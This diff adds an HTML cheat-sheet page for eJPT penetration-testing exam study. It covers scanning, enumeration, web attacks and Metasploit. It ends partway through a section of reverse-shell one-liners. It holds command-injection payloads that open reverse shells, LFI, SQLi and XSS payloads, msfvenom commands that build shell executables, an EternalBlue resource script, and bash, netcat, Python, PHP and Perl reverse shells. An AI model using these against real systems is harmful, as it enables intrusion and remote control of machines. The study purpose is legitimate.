@@ -1,0 +1,919 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eJPT Exam Helper</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    <style>
+        :root {
+            --sidebar-width: 280px;
+            --content-bg: #2b3035; /* Slightly lighter than body for content area */
+            --code-bg: #1c1e21;    /* Darker background for code blocks */
+            --code-text: #e8e6e3;
+            --sidebar-bg: #212529;
+            --sidebar-link-hover: #343a40;
+        }
+
+        body {
+            display: flex;
+            height: 100vh;
+            overflow: hidden; /* Prevent body scroll */
+        }
+
+        #sidebar {
+            width: var(--sidebar-width);
+            height: 100vh;
+            background-color: var(--sidebar-bg);
+            padding-top: 1rem;
+            flex-shrink: 0;
+            overflow-y: auto; /* Allow sidebar scrolling if needed */
+            position: fixed; /* Fixed sidebar */
+            top: 0;
+            left: 0;
+            z-index: 100;
+        }
+
+        #main-content {
+            flex-grow: 1;
+            height: 100vh;
+            overflow-y: auto; /* Allow content scrolling */
+            padding: 2rem;
+            background-color: var(--content-bg);
+            margin-left: var(--sidebar-width); /* Offset content by sidebar width */
+        }
+
+        .sidebar-heading {
+            padding: 0.5rem 1.25rem;
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: var(--bs-secondary-color);
+        }
+
+        .list-group-item {
+            background-color: transparent;
+            border: none;
+            border-radius: 0.25rem;
+            margin: 0 0.5rem 0.2rem 0.5rem; /* Add some margin */
+            transition: background-color 0.15s ease-in-out;
+        }
+
+        .list-group-item.active {
+            background-color: var(--bs-primary);
+            color: #fff;
+        }
+
+        .list-group-item:hover:not(.active) {
+            background-color: var(--sidebar-link-hover);
+        }
+
+        .list-group-item i {
+            margin-right: 0.75rem;
+            width: 1.2em; /* Align icons */
+        }
+
+        .content-section {
+            display: none; /* Hide all sections by default */
+        }
+
+        .content-section.active {
+            display: block; /* Show the active section */
+        }
+
+        /* Code block styling */
+        pre {
+            background-color: var(--code-bg);
+            color: var(--code-text);
+            padding: 1rem;
+            border-radius: 0.375rem;
+            border: 1px solid var(--bs-border-color);
+            overflow-x: auto; /* Allow horizontal scrolling for long lines */
+            font-size: 0.9em;
+            white-space: pre; /* Preserve whitespace and prevent wrapping */
+        }
+
+        code {
+            color: var(--code-text);
+            word-wrap: break-word; /* Allow inline code to wrap if needed */
+            background-color: rgba(110, 118, 129, 0.2); /* Subtle background for inline code */
+            padding: 0.1em 0.3em;
+            border-radius: 3px;
+        }
+
+        pre code {
+            background-color: transparent; /* No extra background inside pre */
+            padding: 0;
+            border-radius: 0;
+        }
+
+        /* Improve checklist readability */
+        .checklist ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        .checklist li {
+            margin-bottom: 0.75rem;
+            padding-left: 1.5rem;
+            position: relative;
+        }
+        .checklist li::before {
+            content: "☐"; /* Unchecked box */
+            position: absolute;
+            left: 0;
+            top: 1px;
+            font-family: 'bootstrap-icons'; /* Or use a text character */
+            color: var(--bs-secondary-color);
+        }
+        /* Style for completed items (optional, manual check) */
+        /* .checklist li.completed::before { content: "☑"; color: var(--bs-success); } */
+
+        h2, h3, h4 {
+            margin-top: 1.5rem;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid var(--bs-border-color);
+            padding-bottom: 0.5rem;
+        }
+         h2:first-child, h3:first-child, h4:first-child {
+             margin-top: 0; /* Remove top margin for first heading */
+         }
+    </style>
+</head>
+<body>
+
+    <!-- Sidebar Navigation -->
+    <div id="sidebar">
+        <div class="sidebar-heading">eJPT Helper</div>
+        <div class="list-group list-group-flush">
+            <a href="#" class="list-group-item list-group-item-action active" data-target="methodology">
+                <i class="bi bi-list-check"></i> Methodology
+            </a>
+            <a href="#" class="list-group-item list-group-item-action" data-target="nmap">
+                <i class="bi bi-search"></i> Nmap
+            </a>
+            <a href="#" class="list-group-item list-group-item-action" data-target="enumeration">
+                <i class="bi bi-binoculars"></i> Enumeration
+            </a>
+            <a href="#" class="list-group-item list-group-item-action" data-target="web-attacks">
+                <i class="bi bi-braces"></i> Web Attacks
+            </a>
+            <a href="#" class="list-group-item list-group-item-action" data-target="metasploit">
+                <i class="bi bi-radioactive"></i> Metasploit
+            </a>
+             <a href="#" class="list-group-item list-group-item-action" data-target="payloads-shells">
+                <i class="bi bi-terminal"></i> Payloads & Shells
+            </a>
+            <a href="#" class="list-group-item list-group-item-action" data-target="privesc">
+                <i class="bi bi-shield-lock"></i> Privilege Escalation
+            </a>
+            <a href="#" class="list-group-item list-group-item-action" data-target="pivoting">
+                <i class="bi bi-diagram-3"></i> Pivoting
+            </a>
+            <a href="#" class="list-group-item list-group-item-action" data-target="password-attacks">
+                <i class="bi bi-key"></i> Password Attacks
+            </a>
+            <a href="#" class="list-group-item list-group-item-action" data-target="os-commands">
+                <i class="bi bi-file-code"></i> OS Commands
+            </a>
+        </div>
+    </div>
+
+    <!-- Main Content Area -->
+    <div id="main-content">
+
+        <!-- Methodology Section -->
+        <div id="methodology" class="content-section active checklist">
+            <h2><i class="bi bi-list-check"></i> Penetration Testing Methodology Checklist</h2>
+
+            <h4>Phase 1: Information Gathering & Scanning</h4>
+            <ul>
+                <li>Understand Scope: Identify the target IP range(s) provided.</li>
+                <li>Host Discovery: Find live hosts within the scope. <pre><code class="language-bash">sudo nmap -sn <TARGET_RANGE></code></pre> Document live IPs.</li>
+                <li>Port Scanning: Identify open TCP/UDP ports on live hosts.<pre><code class="language-bash">sudo nmap -sS -p- <TARGET_IP> # (Full - Slow) OR
+sudo nmap -sS --top-ports 1000 <TARGET_IP> # (Faster) OR
+sudo nmap -F <TARGET_IP> # (Top 100)
+# Consider -sU for common UDP ports</code></pre> Document open ports per host.</li>
+            </ul>
+
+            <h4>Phase 2: Enumeration</h4>
+            <ul>
+                <li>Service Version Detection: Identify services and versions. <pre><code class="language-bash">sudo nmap -sV -p<PORT_LIST> <TARGET_IP></code></pre></li>
+                <li>Default Scripting (NSE): Run basic Nmap enumeration scripts. <pre><code class="language-bash">sudo nmap -sC -p<PORT_LIST> <TARGET_IP></code></pre></li>
+                <li>Combine Scans: (Efficient start) <pre><code class="language-bash">sudo nmap -sS -sV -sC -p<PORT_LIST> <TARGET_IP> -oA nmap_scan_<TARGET_IP></code></pre></li>
+                <li>Service-Specific Enumeration: Web (Gobuster, Nikto, Burp), SMB (enum4linux-ng, smbclient), NFS (showmount), SNMP (snmp-check), DNS (dig axfr), SMTP (smtp-user-enum), FTP (anon login), etc.</li>
+                <li>Document Findings: Ports, Services, Versions, Shares, Usernames, Directories, Potential Vulns, Interesting Files. **Crucial!**</li>
+            </ul>
+
+            <h4>Phase 3: Vulnerability Assessment & Exploitation</h4>
+            <ul>
+                <li>Analyze Enumeration: Correlate versions/configs with known vulnerabilities.</li>
+                <li>Search for Exploits: `searchsploit`, `msfconsole search`, Exploit-DB.</li>
+                <li>Check for Misconfigurations: Default/weak creds (Hydra), exposed files, LFI, Command Inj, basic SQLi.</li>
+                <li>Select & Configure Exploit: Metasploit (`use`, `set RHOSTS/LHOST/payload`) or manual code.</li>
+                <li>Set Up Listener: `nc -nlvp <PORT>` or `msfconsole -> use exploit/multi/handler`.</li>
+                <li>Execute Exploit: `exploit` / `run` or run manual script.</li>
+                <li>Gain Initial Access: Obtain shell or Meterpreter session.</li>
+                <li>Document: Exploit used, options, payload, success details.</li>
+            </ul>
+
+            <h4>Phase 4: Post-Exploitation & Privilege Escalation</h4>
+            <ul>
+                <li>Stabilize Shell: Upgrade if needed (Python PTY).</li>
+                <li>Basic Enumeration (on Target): `whoami`, `id`, `hostname`, `uname -a`/`systeminfo`, `ipconfig`/`ifconfig`, `netstat`/`ss`.</li>
+                <li>Upload & Run Enumeration Scripts: **LinPEAS / WinPEAS**. Analyze output.</li>
+                <li>Manual PrivEsc Checks: `sudo -l`, SUID (GTFOBins), Kernel exploits, Writable files/cron, Unquoted service paths, AlwaysInstallElevated, Service perms, Stored creds.</li>
+                <li>Execute PrivEsc: Use identified vector.</li>
+                <li>Verify Privileges: `whoami`, `id`.</li>
+                <li>Document: Enum script results, vector used, commands.</li>
+            </ul>
+
+            <h4>Phase 5: Pivoting & Lateral Movement (If Applicable)</h4>
+            <ul>
+                <li>Identify Internal Networks: `ipconfig`/`ifconfig`, `route` on compromised host.</li>
+                <li>Set Up Pivot: Metasploit `autoroute`, `portfwd`, or `socks_proxy` + `proxychains`.</li>
+                <li>Scan Internal Network: Use Nmap via pivot.</li>
+                <li>Repeat Phases 2-4 on internal targets.</li>
+                <li>Document: Pivot setup, internal findings, lateral movement steps.</li>
+            </ul>
+
+             <h4>Phase 6: Reporting & Flag Capture</h4>
+            <ul>
+                <li>Locate Flags/Evidence: Find required proof per exam objectives.</li>
+                <li>Record Flags/Evidence: Note location and content accurately.</li>
+                <li>Take Screenshots: Critical steps (exploitation, privesc, flag location).</li>
+                <li>Review Documentation: Ensure clarity and completeness.</li>
+            </ul>
+
+            <h4>Continuous Tasks</h4>
+            <ul>
+                <li>**DOCUMENT EVERYTHING:** Commands, output, findings, reasoning, IPs, ports, services, creds, vulns, exploits, flags. Use structured notes.</li>
+                <li>**TAKE SCREENSHOTS:** Key moments, success, flags.</li>
+                <li>**MANAGE TIME:** Don't get stuck. Move on, revisit later.</li>
+            </ul>
+        </div>
+
+        <!-- Nmap Section -->
+        <div id="nmap" class="content-section">
+            <h2><i class="bi bi-search"></i> Nmap Quick Reference</h2>
+            <!-- CONTENT FROM 01_nmap_cheatsheet.md GOES HERE -->
+            <!-- Convert Markdown to HTML: Use <pre><code> for code blocks -->
+
+            <h3>Host Discovery (Ping Scans)</h3>
+            <ul>
+                <li><strong>Standard Ping Scan (ICMP, TCP SYN/ACK, ARP):</strong> Most common, usually reliable on local networks.
+                    <pre><code class="language-bash">sudo nmap -sn <TARGET_IP_RANGE> -oN nmap_discovery.txt
+# Example: sudo nmap -sn 192.168.1.0/24</code></pre>
+                </li>
+                <li><strong>No Ping (Assume hosts are up):</strong> Use if ICMP is blocked, but slower.
+                    <pre><code class="language-bash">sudo nmap -Pn ... <TARGET_IP_RANGE></code></pre>
+                </li>
+                <li><strong>Specific Ping Types:</strong> `-PE`, `-PP`, `-PM`, `-PS<portlist>`, `-PA<portlist>`, `-PU<portlist>`</li>
+            </ul>
+
+            <h3>Port Scanning</h3>
+            <ul>
+                <li><strong>SYN Scan (Stealth - Default & Preferred):</strong> Fast, needs root/sudo.
+                    <pre><code class="language-bash">sudo nmap -sS <TARGET_IP></code></pre>
+                </li>
+                <li><strong>TCP Connect Scan:</strong> Slower, more logged, no root needed.
+                    <pre><code class="language-bash">nmap -sT <TARGET_IP></code></pre>
+                </li>
+                <li><strong>UDP Scan:</strong> Slow, less reliable. Combine with `-sV`.
+                    <pre><code class="language-bash">sudo nmap -sU <TARGET_IP> # Common UDP ports
+sudo nmap -sU -p 161,53 <TARGET_IP> # Specific UDP ports</code></pre>
+                </li>
+                <li><strong>Specific Ports:</strong>
+                    <pre><code class="language-bash">nmap -p 80,443,22 <TARGET_IP>
+nmap -p U:53,T:21-25,80,443 <TARGET_IP></code></pre>
+                </li>
+                <li><strong>Top Ports (Faster):</strong>
+                    <pre><code class="language-bash">nmap -F <TARGET_IP> # Top 100
+nmap --top-ports 1000 <TARGET_IP> # Top 1000</code></pre>
+                </li>
+                <li><strong>All Ports (Slow!):</strong>
+                    <pre><code class="language-bash">nmap -p- <TARGET_IP></code></pre>
+                </li>
+            </ul>
+
+            <h3>Service, Version & OS Detection</h3>
+            <ul>
+                <li><strong>Service Version Detection:</strong> Essential.
+                    <pre><code class="language-bash">nmap -sV <TARGET_IP></code></pre>
+                </li>
+                <li><strong>OS Detection:</strong> Needs root/sudo.
+                    <pre><code class="language-bash">sudo nmap -O <TARGET_IP></code></pre>
+                </li>
+                <li><strong>Aggressive Scan:</strong> OS, Version, Default Scripts, Traceroute. Noisy.
+                    <pre><code class="language-bash">sudo nmap -A <TARGET_IP></code></pre>
+                </li>
+            </ul>
+
+            <h3>Nmap Scripting Engine (NSE)</h3>
+            <ul>
+                <li><strong>Default Safe Scripts:</strong> Great starting point.
+                    <pre><code class="language-bash">nmap -sC <TARGET_IP> # Equivalent to --script=default</code></pre>
+                </li>
+                <li><strong>Combine Common Scans:</strong> **(Highly Recommended Starting Point)**
+                    <pre><code class="language-bash">sudo nmap -sS -sV -sC -O -p- <TARGET_IP> -oA nmap_full_scan # (-p- is slow)
+sudo nmap -sS -sV -sC -p 1-10000 <TARGET_IP> -oA nmap_common_scan # Faster</code></pre>
+                </li>
+                <li><strong>Run Specific Script(s):</strong>
+                    <pre><code class="language-bash">nmap --script smb-enum-shares.nse <TARGET_IP>
+nmap --script "http-*" <TARGET_IP></code></pre>
+                </li>
+                <li><strong>Run Script Category:</strong>
+                    <pre><code class="language-bash">nmap --script vuln <TARGET_IP> # Check known vulns (noisy/risky)</code></pre>
+                </li>
+            </ul>
+
+            <h3>Output Formats</h3>
+            <ul>
+                <li>`-oN`: Normal text file.</li>
+                <li>`-oX`: XML file (for parsing).</li>
+                <li>`-oG`: Grepable file.</li>
+                <li>`-oA <basename>`: **All formats (Recommended).**</li>
+            </ul>
+
+            <h3>Timing & Performance</h3>
+            <ul>
+                <li><strong>Timing Templates:</strong> `-T<0-5>` (e.g., `-T4` common).</li>
+                <li><strong>Minimum Packet Rate:</strong> `--min-rate <rate>` (e.g., `--min-rate 500`).</li>
+            </ul>
+
+            <h3>Example Workflow Command</h3>
+            <pre><code class="language-bash"># 1. Discover live hosts
+sudo nmap -sn 192.168.1.0/24 -oG discovered_hosts.gnmap | grep "Status: Up" | cut -d' ' -f2 > live_hosts.txt
+
+# 2. Perform detailed scan on live hosts (adjust ports)
+sudo nmap -sS -sV -sC -p- -iL live_hosts.txt -oA nmap_detailed_scan -T4 --min-rate 1000</code></pre>
+
+        </div>
+
+        <!-- Enumeration Section -->
+        <div id="enumeration" class="content-section">
+             <h2><i class="bi bi-binoculars"></i> Enumeration Quick Reference</h2>
+             <!-- CONTENT FROM 02_enumeration_cheatsheet.md GOES HERE -->
+             <p><em>Always correlate findings with Nmap <code>-sV -sC</code> results.</em></p>
+
+            <h3>Web (HTTP/HTTPS - Ports 80, 443, etc.)</h3>
+            <ul>
+                <li><strong>Directory/File Brute-forcing:</strong>
+                    <pre><code class="language-bash"># Gobuster (Common)
+gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -t 50 -o gobuster_results.txt
+
+# Feroxbuster (Fast, Recursive)
+feroxbuster -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -t 50 -o feroxbuster_results.txt</code></pre>
+                </li>
+                <li><strong>Web Server Vulnerability Scanner:</strong>
+                    <pre><code class="language-bash">nikto -h http://<TARGET_IP>:<PORT> -output nikto_scan.txt</code></pre>
+                </li>
+                <li><strong>Manual Inspection:</strong> Use Browser Dev Tools (F12) & Burp Suite (Proxy, Repeater). Look for: <code>robots.txt</code>, <code>sitemap.xml</code>, comments, JS files, directory indexing, default creds, headers.</li>
+            </ul>
+
+            <h3>SMB (Ports 139, 445)</h3>
+            <ul>
+                <li><strong>Nmap Scripts:</strong>
+                    <pre><code class="language-bash">nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery <TARGET_IP></code></pre>
+                </li>
+                <li><strong>List Shares:</strong>
+                    <pre><code class="language-bash">smbclient -L //<TARGET_IP>/ -N # Anonymous
+smbclient -L //<TARGET_IP>/ -U <USERNAME>%<PASSWORD> # Authenticated
+enum4linux-ng -A <TARGET_IP> # Comprehensive</code></pre>
+                </li>
+                <li><strong>Connect to Share:</strong>
+                    <pre><code class="language-bash">smbclient //<TARGET_IP>/<SHARE_NAME> -N # Anonymous
+smbclient //<TARGET_IP>/<SHARE_NAME> -U <USERNAME>%<PASSWORD>
+# Commands: ls, cd, get, put, help</code></pre>
+                </li>
+            </ul>
+
+            <h3>NFS (Port 2049)</h3>
+            <ul>
+                <li><strong>List Exports:</strong>
+                    <pre><code class="language-bash">showmount -e <TARGET_IP>
+nmap -p 111,2049 --script=nfs-ls,nfs-showmount <TARGET_IP></code></pre>
+                </li>
+                <li><strong>Mount Export:</strong> (Requires `nfs-common`)
+                    <pre><code class="language-bash">sudo mkdir /mnt/nfs_share
+sudo mount -t nfs <TARGET_IP>:/<EXPORTED_PATH> /mnt/nfs_share -o nolock
+# Remember to umount /mnt/nfs_share</code></pre>
+                </li>
+            </ul>
+
+            <h3>SNMP (Port 161/UDP)</h3>
+            <ul>
+                <li><strong>Check Common Community Strings:</strong> (`public`, `private`)
+                    <pre><code class="language-bash">snmp-check -t <TARGET_IP> -c public
+nmap -sU -p 161 --script=snmp-info,snmp-interfaces,snmp-processes <TARGET_IP></code></pre>
+                </li>
+                <li><strong>Walk MIB Tree:</strong>
+                    <pre><code class="language-bash">snmpwalk -c public -v1 <TARGET_IP> # Try -v2c if needed</code></pre>
+                </li>
+            </ul>
+
+             <h3>DNS (Port 53/UDP/TCP)</h3>
+            <ul>
+                <li><strong>Check Zone Transfers (AXFR):</strong>
+                    <pre><code class="language-bash">dig axfr @<DNS_SERVER_IP> <DOMAIN_NAME>
+nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=<DOMAIN_NAME> <DNS_SERVER_IP></code></pre>
+                </li>
+            </ul>
+
+            <h3>SMTP (Port 25)</h3>
+            <ul>
+                <li><strong>Enumerate Users (VRFY, EXPN, RCPT TO):</strong>
+                    <pre><code class="language-bash">nmap -p 25 --script=smtp-commands,smtp-enum-users <TARGET_IP>
+smtp-user-enum -M VRFY -U /path/to/users.txt -t <TARGET_IP>
+# Manual: telnet <TARGET_IP> 25 -> VRFY <username></code></pre>
+                </li>
+            </ul>
+
+            <h3>FTP (Port 21)</h3>
+            <ul>
+                <li><strong>Check Anonymous Login:</strong>
+                    <pre><code class="language-bash">nmap -p 21 --script=ftp-anon <TARGET_IP>
+ftp <TARGET_IP> # User 'anonymous', any password</code></pre>
+                </li>
+            </ul>
+
+            <h3>SSH (Port 22) / Telnet (Port 23)</h3>
+            <ul>
+                <li><strong>Identify Version:</strong> Nmap `-sV` or `nc <TARGET_IP> <PORT>`. Check for default creds on Telnet.</li>
+            </ul>
+        </div>
+
+        <!-- Web Attacks Section -->
+        <div id="web-attacks" class="content-section">
+             <h2><i class="bi bi-braces"></i> Web Application Attack Basics</h2>
+             <!-- CONTENT FROM 05_web_attacks_cheatsheet.md GOES HERE -->
+             <h3>Burp Suite Basics (Community Edition)</h3>
+            <ul>
+                <li><strong>Proxy Setup:</strong> Browser (FoxyProxy) -> `127.0.0.1:8080`. Burp Proxy -> `Intercept is on`.</li>
+                <li><strong>Scope:</strong> Target tab -> Right-click host -> `Add to Scope`. Filter `Show only in-scope items`.</li>
+                <li><strong>Repeater:</strong> Send request (`Ctrl+R`). Modify request (URL, headers, body). Click `Send`. Analyze response.</li>
+                <li><strong>Intruder (Basic Fuzzing):</strong>
+                    <ol>
+                        <li>Send request (`Ctrl+I`).</li>
+                        <li>Positions tab: `Clear §`. Add `§` around parameter value to fuzz (e.g., `?file=§payload§`).</li>
+                        <li>Attack type: `Sniper`.</li>
+                        <li>Payloads tab: Type `Simple list`. Add/Paste/Load wordlist.</li>
+                        <li>`Start attack`. Analyze results table (Status, Length).</li>
+                    </ol>
+                </li>
+            </ul>
+
+            <h3>Directory Traversal / Local File Inclusion (LFI)</h3>
+            <ul>
+                <li><strong>Identify:</strong> Parameters like `?file=`, `?page=`, `?view=`.</li>
+                <li><strong>Common Payloads:</strong>
+                    <ul>
+                        <li>Linux: `../../etc/passwd`, `../../../etc/passwd`, `....//....//etc/passwd`</li>
+                        <li>Windows: `../../windows/win.ini`, `..\\..\\windows\\win.ini`</li>
+                    </ul>
+                </li>
+                <li><strong>PHP Wrappers:</strong>
+                    <ul>
+                        <li>View source: `php://filter/convert.base64-encode/resource=index.php` (Decode Base64)</li>
+                        <li>Include file: `php://filter/resource=/etc/passwd`</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <h3>Command Injection</h3>
+            <ul>
+                <li><strong>Identify:</strong> Parameters used in system commands (`?ip=`, `?host=`, `?cmd=`).</li>
+                <li><strong>Separators:</strong> `;`, `&&`, `|`, `||`, `` ` `` (backticks), `%0a` (newline).</li>
+                <li><strong>Payload Examples:</strong>
+                    <ul>
+                        <li>Verify: `<PARAM_VALUE>; id`, `<PARAM_VALUE> | whoami`</li>
+                        <li>Blind (Check listener): `<PARAM_VALUE> && ping -c 3 <YOUR_IP>`, `<PARAM_VALUE> | nc <YOUR_IP> <PORT>`</li>
+                        <li>Reverse Shell: `<PARAM_VALUE>; nc -e /bin/bash <YOUR_IP> <PORT>`, `<PARAM_VALUE> | bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1`</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <h3>SQL Injection (Basic Detection)</h3>
+            <ul>
+                <li><strong>Identify:</strong> Login forms, search fields, ID parameters.</li>
+                <li><strong>Detection Payloads:</strong>
+                    <ul>
+                        <li>Error-Based: `'`, `"`, `')`, `"))`, `-- -`, `#` (Look for SQL errors).</li>
+                        <li>Boolean-Based: `<PARAM>=valid' OR '1'='1 -- -`, `<PARAM>=valid' AND '1'='2 -- -` (Observe content changes).</li>
+                        <li>Time-Based (Blind): `' OR SLEEP(5)-- -`, `); SLEEP(5)-- -` (Observe delay).</li>
+                    </ul>
+                </li>
+                <li><strong>Basic Union-Based Concept:</strong> `' UNION SELECT null, version(), database() -- -` (Match column count).</li>
+            </ul>
+
+            <h3>Cross-Site Scripting (XSS - Reflected Detection)</h3>
+            <ul>
+                <li><strong>Identify:</strong> Input reflected in page source/content without sanitization.</li>
+                <li><strong>Basic Payloads:</strong> `<script>alert('XSS')</script>`, `<img src=x onerror=alert(1)>`, `"><script>alert('XSS')</script>`</li>
+                <li><strong>Check:</strong> Alert box pops up? Script visible in source?</li>
+            </ul>
+
+            <h3>Authentication/Session</h3>
+            <ul>
+                <li><strong>Password Attacks:</strong> Use Hydra (see Password Attacks sheet). Check default credentials.</li>
+                <li><strong>Session Cookies:</strong> Examine in Burp/DevTools for weak/predictable values.</li>
+            </ul>
+        </div>
+
+        <!-- Metasploit Section -->
+        <div id="metasploit" class="content-section">
+             <h2><i class="bi bi-radioactive"></i> Metasploit Framework Quick Reference</h2>
+             <!-- CONTENT FROM 03_metasploit_cheatsheet.md GOES HERE -->
+             <h3>Core Commands (`msfconsole`)</h3>
+            <ul>
+                <li>Start: `msfconsole` (`-q` for quiet)</li>
+                <li>Search: `search <keyword>`, `search type:exploit platform:windows smb`, `search cve:2017-0144`</li>
+                <li>Select Module: `use <module_path>` (e.g., `use exploit/windows/smb/ms17_010_eternalblue`)</li>
+                <li>Info: `info`</li>
+                <li>Options: `show options`</li>
+                <li>Set Option: `set <OPTION_NAME> <VALUE>` (e.g., `set RHOSTS <TARGET_IP>`, `set LHOST <YOUR_IP>`)</li>
+                <li>Set Global Option: `setg LHOST <YOUR_IP>`</li>
+                <li>Show Payloads: `show payloads`</li>
+                <li>Set Payload: `set payload <payload_path>` (e.g., `set payload windows/meterpreter/reverse_tcp`)</li>
+                <li>Run: `exploit` or `run` (`-j` for background job)</li>
+                <li>Back: `back`</li>
+                <li>Exit: `exit`</li>
+            </ul>
+
+            <h3>Handling Sessions (Jobs & Meterpreter)</h3>
+            <ul>
+                <li>List Jobs: `jobs -l`</li>
+                <li>Interact with Session: `sessions -i <SESSION_ID>`</li>
+                <li>Background Session: `Ctrl+Z` or `background`</li>
+                <li>Kill Job/Session: `jobs -k <JOB_ID>`, `sessions -k <SESSION_ID>`</li>
+            </ul>
+
+            <h3>Multi/Handler (Listener)</h3>
+            <ul>
+                <li>Setup:
+                    <pre><code class="language-bash">use exploit/multi/handler
+set payload <SAME_PAYLOAD_AS_EXPLOIT>
+set LHOST <YOUR_IP>
+set LPORT <LISTENING_PORT>
+run -j # Run as background job</code></pre>
+                </li>
+            </ul>
+
+            <h3>Meterpreter Basics (Post-Exploitation)</h3>
+            <p><em>Run these commands after `sessions -i <ID>`</em></p>
+            <ul>
+                <li><strong>System Info:</strong> `sysinfo`, `getuid`, `pwd`, `ls`, `cd <dir>`</li>
+                <li><strong>Process Mgmt:</strong> `ps`, `migrate <PID>`</li>
+                <li><strong>File System:</strong> `upload /local /remote`, `download /remote /local`, `cat /remote/file`, `edit /remote/file`, `search -f *.txt`</li>
+                <li><strong>Networking:</strong> `ipconfig`/`ifconfig`, `route`, `portfwd add -l <LPORT> -p <RPORT> -r <RHOST>`</li>
+                <li><strong>Get Shell:</strong> `shell`</li>
+                <li><strong>Help:</strong> `help`</li>
+            </ul>
+
+            <h3>Automation & Database</h3>
+            <ul>
+                <li><strong>Resource Scripts (`.rc` files):</strong> Automate setup.
+                    <pre><code class="language-bash"># Example 'exploit.rc':
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+exploit
+
+# Run: resource /path/to/exploit.rc (in msfconsole)
+# OR: msfconsole -r /path/to/exploit.rc</code></pre>
+                </li>
+                <li><strong>Database:</strong> Store scan results, hosts, creds.
+                    <pre><code class="language-bash">db_status
+db_import /path/to/nmap_scan.xml
+hosts
+services
+creds</code></pre>
+                </li>
+            </ul>
+        </div>
+
+        <!-- Payloads & Shells Section -->
+        <div id="payloads-shells" class="content-section">
+             <h2><i class="bi bi-terminal"></i> Payloads & Reverse Shells Quick Reference</h2>
+             <!-- CONTENT FROM 07_payloads_shells_cheatsheet.md GOES HERE -->
+             <h3>`msfvenom` (Standalone Payload Generator)</h3>
+            <ul>
+                <li><strong>Syntax:</strong> `msfvenom -p <payload> LHOST=<YOUR_IP> LPORT=<YOUR_PORT> [Options] -f <format> -o <output_file>`</li>
+                <li><strong>Key Options:</strong> `-p` (payload), `LHOST`, `LPORT`, `-f` (format: exe, elf, php, aspx, py, bash, raw), `-o` (output), `-a` (arch), `-e` (encoder), `-b` (badchars), `--platform`</li>
+                <li><strong>Common Examples:</strong>
+                    <pre><code class="language-bash"># Windows Reverse TCP Meterpreter EXE
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
+
+# Linux Reverse TCP Meterpreter ELF
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell
+
+# PHP Reverse TCP (Meterpreter) - Needs <?php ?> wrapper
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+
+# ASPX Reverse TCP (Meterpreter)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o shell.aspx
+
+# Bash Reverse Shell (Raw)
+msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw -o shell.sh</code></pre>
+                </li>
+            </ul>
+
+            <h3>Netcat Listener</h3>
+            <pre><code class="language-bash">nc -nlvp <LISTENING_PORT></code></pre>
+
+            <h3>Common Reverse Shell One-Liners</h3>
+            <p><em>Replace `<YOUR_IP>` and `<YOUR_PORT>`.</em></p>
+            <ul>
+                <li><strong>Bash:</strong>
+                    <pre><code class="language-bash">bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1</code></pre>
+                </li>
+                <li><strong>Netcat (Traditional `-e`):</strong> *Often missing.*
+                    <pre><code class="language-bash">nc -e /bin/bash <YOUR_IP> <YOUR_PORT></code></pre>
+                </li>
+                <li><strong>Netcat (Alternative):</strong>
+                    <pre><code class="language-bash">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <YOUR_IP> <YOUR_PORT> > /tmp/f</code></pre>
+                </li>
+                <li><strong>Python 2/3:</strong>
+                    <pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",<YOUR_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+                </li>
+                <li><strong>PHP:</strong> *Requires `exec` or similar.*
+                    <pre><code class="language-php">php -r '$sock=fsockopen("<YOUR_IP>",<YOUR_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
+                </li>
+                <li><strong>Perl:</strong>
+                    <pre><code class="language-perl">perl -e 'use Socket;$i="<YOUR_IP>";$p=<YOUR_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code></pre>
+                </li>
+                <li><strong>PowerShell (Windows):</strong>
